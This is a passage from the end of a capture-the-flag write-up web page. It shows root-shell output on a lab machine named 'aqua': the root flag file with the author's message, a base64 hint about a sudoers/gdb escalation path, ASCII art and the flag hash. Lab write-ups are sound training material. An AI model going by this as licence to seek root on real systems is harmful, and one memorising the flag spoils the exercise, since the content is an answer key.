</span><span class="s2">root@aqua</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
192.168.100.43 
</span><span class="s2">root@aqua</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /root/root.txt

Congratulations on getting the root shell!

Try to get root on two ways! [If you have more, well, you're the master then.. :> ]

Need some hint on the harder way of getting root? Decode this : RG8gbm90IHVzZSAvdXNyL3NoYXJlL2dkYiBpbiB0aGUgc3Vkb2VycyBmaWxl 

Or if you don't want any hint, simply don't decode it. XD

You like the box? or not? Hit me up on Twitter @yunaranyancat ;)

                                               ..               ((((##,                            
                                        ,,..*/(/(##%%%%#/*.     ##(##.                             
                                    .,..**.,*////((########%%%( ,%#(                               
                                  ,..,(*(((///((((((((#######%%%%##/,,..                           
                                ,.,(#(//////(((((####((####%%%%###%%#####(///*                     
                              ..*(#/***////((##(///(#(//(#%((((((%%%%%%#######*/,                  
                            ..,##*,,***//((////(#((((((%#**/(((%#((#(#%%%########**.               
                           ,./#/,,,,**//***//(((((((#%%(((((##(*/((#(((%#%#########**,             
                          .,(#*,,,,*..,**/////((##(%#(((((#((((((((#(((#%##%##########*,           
                         ,.(#*.,,,....,*/**///////#(((((((((((((((((((((#%##%##########(*.         
                       ,,,*#*,,..,,,,,*,***,,***/(//(//(((((((((((#(((((##%###############(        
                     ,.,,,(*,,.,,,,,*,*,,,***,,#///*,.,//(((((((((((((((#(###(#%###########(       
                   .. .*,*#*,,,,,,*,*,*,*,,*(#(//*,...*///////(((*/(((((#((###((#%##########%,     
                  .  ,#,,(%******/*******,*##*//*,**,,,*////////,*//((((#(((###(##%##########%*    
                 ,  *%/**((****#(*******/##,*(*/********,.,,,*/..,*/////((/*##(####%##########%.   
                ,  /##*/*(#///#(////**/##/,*////*********, .*,..,,,*////(//*(#(#####%###########.  
               . .*#/#/#//#(/#(///(####(***///#/*********,,*,******///*,,,,,,#((######%##########. 
              , .*#//((##(((#(/////##%%////(/(#/*************/*******////,...#((((#(#(###########( 
             ..,*(/**/(((####(///(#**//(/////##(////***(#**%(*/************,./(((((#(((%#########%*
             ,,*((/*/(#/((#((////****/(///(/(###(((//##//(#(//*/////********,*(((((##(((#%#########
             */(#///(#//(####&@/*,,*/((//(#/(###((#%%#(****///(//(///////****,#//((((#(((#%#######%
            ./(%#(/(#(//(#(**#&@*,*/((///((/(#((###/,,//**/(/#///(///////****,#(///(((#(((#########
            /(#%#(#%%(//*/.,&&&&@/**///*(#///#(,,,,,,,.../((#((((((((((((/***,##//////(((((########
           *(##%##%%%(/*,*  .%%&&*,*//*/##/*//,,,,.     .*#(((((#(((((((#////*%##//////#(((###(((((
          *#**(%#%%(((/. . #//%&/*.****(,.****.,..     .,*/(//((#(((((((#(////%##(/////(#(((###((((
        .,/. ,(%%(#(/#/.   (*..* . ****,  ,***,,,*...  ..*,///(##((((((##((//(%###//////(((((%##(((
      .*,.    *%(//((, .   ,/*,    .***.    .**,(%%&@@#....*///#(((((((##(((/#%%##(//((((#((((###(#
    ,*.        *(//&*  ..           .,*        .../&&&&&&( **//((((((####((((%%%###(((((((#(((#####
              *(%&%(       .                     ./&&&&&&&&**//((((((#(#((((%%%%###(((((((((/((###(
              (/&&%/                            ##/#&%&&&&&&/(((((((##(#(((#%%%%###((((((((((/(%##(
             ,(&%%%#                           .%*,/(&&%&&&%///((((#(((#((/&%%%%#(##(((/(((((//##((
   ....      *#%%%%%,                          .#*...,/%&((##*/(((#(((#((((&%%%%#((#((((((/(((/(#(/
  .,. ...    .#%%%%%(                             ,//*...   ,,((##((((#(((&&%%%%#((##(((((((((/(#/*
 .. .  ...    *%%%%&%,     *(*,                             ,*#((((((##(/(, /%%%##((#(((((((((/(#/*
  .  . . ..  .#/#%%%%#     ,*,..,,.                     ..,//(((((((#(#((/*.#%%%(#((((((((((/(((#/*
  .  .  . .  *(///%%%%/     ,......,.           ..,,,,,**/////(((###(((((,*,%%%%(((((/((((#//((((/*
  .  .  .  .,/#//#//(##       .......,.              .*****/((##%%#((#((*..(%%%%((#((((#(((//(((/(*
  .     .  ,/((/(#/(#(#*                                .*,#(##%#((((#((*.,&%%%%((#((((((((//(#//((
  .      . .#%#/#//&%(/%,                             ,*/(#(#&%(######((%&&&%%%%(/#((((#(#(((#((//(
  .      .  *%/((/#%/%#                          .*/***#(#&%##(#####(&&%&%%%%%(/(#((((###((/(((((
  .  ..  ,.  *.(((&%%(&%%%%#(//**............,,,,,****((#%%%######(%(&&&%%%%%%(/(#(((((###%#(((##
  .  ..  .,  .*#/%%%%/#&%%%######%.........,,,,,,,,,*(#(##%%######(%(&&&%%%%%%#/(##(/(((%###%((##
  .  ..   ,   *%(/#&&%,&((&%%&%%%%%%*.......,,,,**,,,,((((%##%/(####(%%@@@&%&%%%%/(###((((##%##%%##
 .             %%((/((/&&%(%%%&%%%%%%,.....,*,.,,,,//(#(#%%###//((##(%&@@@@%&%%%%((##%#((((###%###%
               /%%(((//////(##%%&%%%((//*...,,**,,,(####%%###((///***#&@@@&@&&%&%(/##(#(########%#(
               ,%%%#((//((#%%%%%#%#(*.......,,*((((##%#(%%((#(#((((/*#&@@@@@@&&%%#/##((#(#########%
               ,##%#%((%%%%%%%%%&@@(*,..,//#######(%%#%%(##(((#((((#&%%&&@@&%%((##(%#(####(#(((
               *#%%#/,      /%&@&&&@&%(/(///(((#(####%%#(##((((((((%&&%%%%%%##%%#(##(%%#///((((((
              . ...    ./%%%###%####%&%((//##%(#%##%%%##&((###(((((((#%%%%%###%%%(##(%%%%/((((///
           ..       ./#%%#%###%%####&&(#%##%######%%####&((###(((#((((##%#####%%&((#(%%%%#((((//*
         ....      %&&@#(%###%%#########%##%##%%%#####%#/#####((#(((%%%######%&@@#(##%%%#%%((/(/*
       ...        #&&&&(#%##%%%##%&%###%#(#%#%%#######%&*####(#((#(((########&@@@&((#%%%##%%#///(
       ..       .%&%&&%%#%%%#%%%####%(##%%%&%#####%%%%%&/####((#(((((%#####%@@@&%&%/##%%%###%#***
       .       ,%#%&&&%%%&%%%%%####%(#%&&%%%&%%%%%%%%%%&%/####((#(((((#%#%%&&#%%&((#%%%######/*
       .    .*(%%&&&&&&%&&%&&%%####%((#&&&&%%%%@&%%%%%%%&&&(/(###/(##(((((#####%%%%((((##%%%#######
          .(#%%%&&&&&&&%%%&%##%%&(##&&&&&%%%%&@@@@&&&&&&&&(/(###/####(/((((#########%(#(%%%######
.      ,(###%%%&&&&&&&&&%#. ./&%(#%&&&&&&%%%#%&%&&&&&&%%%%%%(####/#%%###########%%%#&%(#(#%%#####
..,..*(####%%%%&&&&&&&&&&*,,(#%##(#%&@&&&&&%%###%&&%&&&%%%%%%%%%%%%(/(####%%%%%&&&&&&&&&%(#((%%####
.,*(((#####%%%%&&&&,,,.,.......(##%&&&&&&&&%#####&&&&%%%%%%%%%%%%%%%(//#%%%%%%%%%%%&&&&&&%((/(/#%##
/(((((#####%%%&&&%,.,**,,,/#(((##%&&&%&&&&&####&&&%%%%%%%%%%%%#%%%%(//(#%%#%%%%%%%#%%&&&&((//(/(%
((((((#####&&&&&%%%&&(..*#@(/((#%&&%%%%%%%%&(((%&%%%%%%%%%%%%%%%%%%%(////(%%%%%%%%%%#%%#%%#((/(//
/(((**,*##&@&&&%%&%%/../(#@,((##&&&%%%%%%%%%(((%%%%%%%%%%%%%#%%%%%%%%(//////(%%%%%%%%(//#%%%((//(
........(##@@&&((.../(/%&/(%#&&&%%%%%%%%%%%&(((#%%%%%%%%%%%%%%%%%%#%%%%(//////////////#&&&%%%##%#
.......,#((*/&(#*,,/#/*&&(%%#&&&%%%%%%%%%%%%%((%%%%%%%%%%%%%%%%%%#%%#%%%%///////////(&&&%%%%%####
......./((///%#%%/,,*#(,/&%%%%&%%%%%%%%%%%%%%/(%%%%%%%%%%%%%%%%%%###%%%%%%%%%#(##%&%%%%%#%%%%%%##
.......(,**#%%%####%%(,*(&&%%%%%&%#%%%%%##%%%%%/(%%%%%%%%%%%%%%%%%%%%%%%%%#%%%%%%%%%%%%%%%%##%%%%##
....,*...#%%%#((####(,,,/&&%%%%%%%#%%%%%%%%%%%%(%%%%%%%%%%%%%%%%%%%%%%%%%%%#%%%%%%%%%%%%#########%%
..,*.,./%&%((((##(((,.,./&&%%%%%%&%%%%%%%%%%%%%#&%%%%%%%%%%%%%%%&%%%%%%%%%%%%%%%%%#%%%%%(((########
%(.*..#&%(((((#(/((. .,.(&&%%%%%%%%%%%%%%%%%%#%%%%%%%%%%%%%%%%#&%%%%%%%%%%#%%%#%%%%%%%%(/#* ,(#####
,,*.*%&(((((((//(((..*.,&%&%%%%%%##(#%%#%%%%%%%%%&%%%%%%%%%%%#%%%%%#%%%%%%%%%%%%%%%%%%#/#**    *(#(
/,,#%%(((((/////((/,*,.%%%&%%#%%#%##%%%%#%%%%%%%%%%&%%%%%%%%%#&%%%%%%%%%%%%%%%%%%%#%%#(##&/        
,,/%#((((/((////((,**,,&%%&%#%%%#%%%%%%%%%%%%%%%%%%%%&&&%%%%%&&%%%%%%%%%%%%%%%%%%%%%##%#%&&        
%/%&%((///////(/(*,*,,(#%%%#%%%%%%%%%%%%%%%%%%%%%%&&&&&&&&&&&&%%%%%%%%%%%%%%%%%%%%%%%%%%%(       
(%%%######((///((,,*,,%#%%%%%%%%%%%%%%%%%%%%%%%%%%&&&&&&&&&&&&%%%%%%%%%%%%%%%%#%%%%%%%%%%%(      
%%%####((/*(#####/**,/&#%%%%%%%%%%%%%%%%%%%%%%%%#&&&&&&&&&&&&&@&%%%%%%%%%%%%%%#%%%%%%%%%%%%/.    
%%#####((((#%%%%%%%%%%&(%%%%%%%%%%%%%%%%%%%%%%%%%&%%&&&&&&&&&&&&&%%%%%%%%%%%%%%&%%%%%%%%%#/    
&%%#(((####%%%%%%&&%%&&%%(%%%%%%%%%%%%%%%%%%%%%%%#%%%%%&&&&&&&&&&&&&%%%%%%%%%%%%&&%%%%%%%%%%%%#/  

CCD758E72A8A8CB5F140BAB26837F363908550F2558ED86D229EC9016FED49B9

</span><span class="s2">root@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
</code></pre></div></div>

<p><a href="./../../">Página Principal</a></p>

      </section>
    </div>
  </body>
</html>
